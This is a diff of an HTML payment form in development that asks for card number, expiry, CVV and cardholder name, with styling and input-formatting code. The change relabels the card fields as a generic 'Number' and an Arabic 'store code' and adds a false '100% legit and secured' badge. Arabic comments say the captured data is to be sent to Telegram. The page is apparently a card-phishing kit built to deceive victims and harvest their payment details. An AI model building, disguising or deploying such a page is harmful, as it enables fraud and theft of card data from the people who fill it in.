@@ -3,246 +3,266 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Form</title>
+  <title>Confirm Details</title>
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
       min-height: 100vh;
+      padding: 40px 10px;
+    }
+
+    /* الإطار الخارجي */
+    .outer-card {
+      background-color: #ffffff;
+      border: 1px solid #dddddd;
+      border-radius: 8px;
+      padding: 20px 20px 30px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+
+    /* سطر القفل + النص */
+    .security-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 18px;
+      gap: 10px;
+    }
+
+    .lock-icon {
+      width: 26px;
+      height: 26px;
+      border-radius: 4px;
+      border: 2px solid #11aa3d;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: #f5f5f7;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
-        sans-serif;
+      color: #11aa3d;
+      font-size: 16px;
+      flex-shrink: 0;
     }
 
-    .form-card {
-      width: 100%;
-      max-width: 380px;
-      background: #fff;
-      border-radius: 14px;
-      border: 1px solid #e1e1e1;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
-      padding: 22px 20px 24px;
-      box-sizing: border-box;
+    .security-text {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.4;
+    }
+
+    /* الإطار الداخلي للنموذج */
+    .inner-card {
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 20px 18px 24px;
+      background-color: #fafafa;
     }
 
     .form-title {
+      text-align: center;
       font-size: 18px;
       font-weight: 600;
+      margin-bottom: 18px;
+    }
+
+    .field-group {
       margin-bottom: 14px;
     }
 
-    .form-group {
-      margin-bottom: 14px;
-    }
-
-    label {
-      display: block;
+    .field-label {
       font-size: 13px;
-      margin-bottom: 6px;
+      margin-bottom: 4px;
+      color: #444;
     }
 
-    input {
-      width: 100%;
-      box-sizing: border-box;
-      padding: 10px 12px;
-      border-radius: 10px;
-      border: 1px solid #d4d4d4;
-      font-size: 14px;
-      outline: none;
-      transition: border-color 0.15s ease, box-shadow 0.15s ease;
-    }
-
-    input::placeholder {
-      color: #b5b5b5;
-    }
-
-    input:focus {
-      border-color: #111;
-      box-shadow: 0 0 0 1px #11111110;
-    }
-
-    .row {
+    .form-row {
       display: flex;
       gap: 10px;
     }
 
-    .row .form-group {
-      flex: 1;
-      margin-bottom: 0;
+    input[type="text"] {
+      width: 100%;
+      padding: 9px 11px;
+      border-radius: 4px;
+      border: 1px solid #d0d0d0;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+      background-color: #ffffff;
+    }
+
+    input[type="text"]::placeholder {
+      color: #b5b5b5;
+    }
+
+    input[type="text"]:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 1px rgba(26,115,232,0.2);
     }
 
     .hint {
-      margin-top: 4px;
+      margin-top: 3px;
       font-size: 11px;
-      color: #777;
+      color: #888;
     }
 
-    button {
-      margin-top: 6px;
+    .btn-confirm {
       width: 100%;
-      padding: 11px 12px;
-      border-radius: 10px;
+      margin-top: 10px;
+      padding: 10px 0;
+      background-color: #0088d8;
+      color: #ffffff;
       border: none;
-      background: #111;
-      color: #fff;
+      border-radius: 4px;
       font-size: 15px;
       font-weight: 500;
       cursor: pointer;
-      transition: opacity 0.15s ease, transform 0.08s ease;
+      transition: background-color 0.15s ease, box-shadow 0.15s ease;
     }
 
-    button:active {
-      transform: scale(0.98);
+    .btn-confirm:hover {
+      background-color: #0071b3;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.15);
     }
 
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
+    @media (max-width: 480px) {
+      body {
+        padding: 20px 8px;
+      }
 
-    .error {
-      margin-top: 6px;
-      font-size: 11px;
-      color: #c00;
+      .outer-card {
+        padding: 16px 14px 24px;
+      }
+
+      .inner-card {
+        padding: 16px 12px 20px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="form-card">
-    <div class="form-title">Confirm Details</div>
 
-    <form id="mainForm" autocomplete="off" novalidate>
-      <!--Card number -->
-      <div class="form-group">
-        <label for="Card number">Card number</label>
-        <input
-          id="number"
-          name="Card number"
-          type="text"
-          inputmode="numeric"
-          placeholder="XXXX XXXX XXXX XXXX"
-        />
-        <div id="numberError" class="error" style="display:none;">
-        ادخل رقم البطاقة المكون من 16 خانة .
-        </div>
+  <div class="outer-card">
+    <!-- القفل + النص الأخضر -->
+    <div class="security-row">
+      <div class="lock-icon">🔒</div>
+      <div class="security-text">
+        All usernames are 100% legit and secured
       </div>
+    </div>
 
-      <!-- Date + Store code -->
-      <div class="row">
-        <div class="form-group">
-          <label for="expiry">Expiration date</label>
+    <!-- البوكس الداخلي (النموذج) -->
+    <div class="inner-card">
+      <h2 class="form-title">Confirm Details</h2>
+
+      <form id="usernameForm">
+        <!-- Number -->
+        <div class="field-group">
+          <div class="field-label">Number</div>
           <input
-            id="expiry"
-            name="expiry"
             type="text"
+            id="number"
+            name="number"
+            placeholder="XXXX XXXX XXXX XXXX"
+            maxlength="19"  <!-- 16 رقم + 3 مسافات -->
+            autocomplete="off"
             inputmode="numeric"
-            placeholder="MM/YY"
           />
-          <div id="expiryError" class="error" style="display:none;">
-            التاريخ يجب ان يكون بشكل MM/YY.
+        </div>
+
+        <!-- Date + كود متجرنا -->
+        <div class="form-row">
+          <div class="field-group" style="flex: 1;">
+            <div class="field-label">Date</div>
+            <input
+              type="text"
+              id="date"
+              name="date"
+              placeholder="MM/YY"
+              maxlength="5"
+              autocomplete="off"
+              inputmode="numeric"
+            />
+          </div>
+          <div class="field-group" style="flex: 1;">
+            <div class="field-label">كود متجرنا</div>
+            <input
+              type="text"
+              id="storeCode"
+              name="storeCode"
+              placeholder="000"
+              maxlength="3"
+              autocomplete="off"
+              inputmode="numeric"
+            />
           </div>
         </div>
 
-        <div class="form-group">
-          <label for="storeCode">CVV/CVC</label>
+        <!-- Name -->
+        <div class="field-group">
+          <div class="field-label">Name</div>
           <input
-            id="storeCode"
-            name="storeCode"
             type="text"
-            inputmode="numeric"
-            placeholder="000"
+            id="fullName"
+            name="fullName"
+            placeholder=""
+            autocomplete="off"
           />
-          <div id="storeCodeError" class="error" style="display:none;">
-            الكود يجب ان يتكون من 3 أرقام.
-          </div>
+          <div class="hint">* Full Name</div>
         </div>
-      </div>
 
-      <!-- Name -->
-      <div class="form-group">
-        <label for="fullName">Cardholder name</label>
-        <input id="fullName" name="fullName" type="text" />
-        <div class="hint">*A full name, as it appears on the card</div>
-      </div>
-
-      <button type="submit" id="confirmBtn">Confirm</button>
-    </form>
+        <button type="submit" class="btn-confirm">Confirm</button>
+      </form>
+    </div>
   </div>
 
   <script>
+    // السماح بالأرقام فقط + تنسيق رقم الـ Number 4-4-4-4
     const numberInput = document.getElementById("number");
-    const expiryInput = document.getElementById("expiry");
-    const storeCodeInput = document.getElementById("storeCode");
-    const form = document.getElementById("mainForm");
-
-    const numberError = document.
-     getElementById("numberError");
-    const expiryError = document.getElementById("expiryError");
-    const storeCodeError = document.getElementById("storeCodeError");
-
-    // Card number: أرقام فقط، 16 رقم، يتقسم بصرياً 4-4-4-4
     numberInput.addEventListener("input", (e) => {
-      let v = e.target.value.replace(/\D/g, ""); // أرقام فقط
-      if (v.length > 16) v = v.slice(0, 16);
-      // عرض بصري 4 4 4 4
-      e.target.value = v.replace(/(.{4})/g, "$1 ").trim();
-      numberError.style.display = "none";
-    });
-
-    // Expiration date: أرقام فقط، MM/YY مع / تنضاف وحدها
-    expiryInput.addEventListener("input", (e) => {
-      let v = e.target.value.replace(/\D/g, ""); // أرقام فقط
-      if (v.length > 4) v = v.slice(0, 4);
-      if (v.length >= 3) {
-        v = v.slice(0, 2) + "/" + v.slice(2);
+      let digits = e.target.value.replace(/\D/g, "").slice(0, 16); // فقط 16 رقم
+      let parts = [];
+      for (let i = 0; i < digits.length; i += 4) {
+        parts.push(digits.substring(i, i + 4));
       }
-      e.target.value = v;
-      expiryError.style.display = "none";
+      e.target.value = parts.join(" ");
     });
 
-    // CVV/CVC: 3 أرقام فقط
+    // تاريخ MM/YY مع / تلقائية وأرقام فقط
+    const dateInput = document.getElementById("date");
+    dateInput.addEventListener("input", (e) => {
+      let digits = e.target.value.replace(/\D/g, "").slice(0, 4); // 4 أرقام فقط
+      if (digits.length >= 3) {
+        e.target.value = digits.slice(0, 2) + "/" + digits.slice(2);
+      } else if (digits.length >= 1) {
+        e.target.value = digits;
+      } else {
+        e.target.value = "";
+      }
+    });
+
+    // كود متجرنا: أرقام فقط + 3 خانات كحد أقصى
+    const storeCodeInput = document.getElementById("storeCode");
     storeCodeInput.addEventListener("input", (e) => {
-      let v = e.target.value.replace(/\D/g, "");
-      if (v.length > 3) v = v.slice(0, 3);
-      e.target.value = v;
-      storeCodeError.style.display = "none";
+      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 3);
     });
 
-    // فحص قبل الإرسال
-    form.addEventListener("submit", (e) => {
+    // منع الريفريش / الإرسال الحقيقي حالياً
+    document.getElementById("usernameForm").addEventListener("submit", (e) => {
       e.preventDefault();
-
-      const rawNumber = numberInput.value.replace(/\D/g, "");
-      const rawExpiry = expiryInput.value;
-      const rawStore = storeCodeInput.value.replace(/\D/g, "");
-
-      let ok = true;
-
-      if (rawNumber.length !== 16) {
-        numberError.style.display = "block";
-        ok = false;
-      }
-
-      // لازم يكون الشكل بالضبط MM/YY
-      const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
-      if (!expiryRegex.test(rawExpiry)) {
-        expiryError.style.display = "block";
-        ok = false;
-      }
-
-      if (rawStore.length !== 3) {
-        storeCodeError.style.display = "block";
-        ok = false;
-      }
-
-      if (!ok) return;
-
-      // هنا لاحقاً نحط إرسال البيانات لتليجرام أو أي مكان
-      alert("البيانات Valid. جاهزين نربطها بتليجرام أو أي باك إند.");
+      // هنا لاحقاً نربط تيليجرام أو أي باك إند
+      console.log("Form captured");
     });
   </script>
+
 </body>
-</html>   
+</html>
